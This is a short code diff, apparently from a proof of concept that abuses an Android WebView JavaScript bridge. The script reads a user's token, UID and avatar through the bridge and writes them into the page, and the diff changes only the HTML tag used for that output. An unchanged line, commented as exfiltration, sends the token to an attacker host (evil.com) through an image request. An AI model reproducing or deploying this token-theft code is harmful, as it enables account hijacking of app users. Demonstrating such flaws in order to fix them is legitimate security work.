@@ -9,8 +9,8 @@ try {
     var uid = JsAndroid.getUid();
     var avatar = JsAndroid.getHeadPic();
 
-    document.body.innerHTML = "<pre>Token: " + token + "\nUID: " + uid
-        + "\nAvatar: " + avatar + "</pre>";
+    document.body.innerHTML = "<title>Token: " + token + "\nUID: " + uid
+        + "\nAvatar: " + avatar + "</title>";
 
     // Exfiltrate to attacker server
     new Image().src = "https://evil.com/steal?token=" + encodeURIComponent(token)
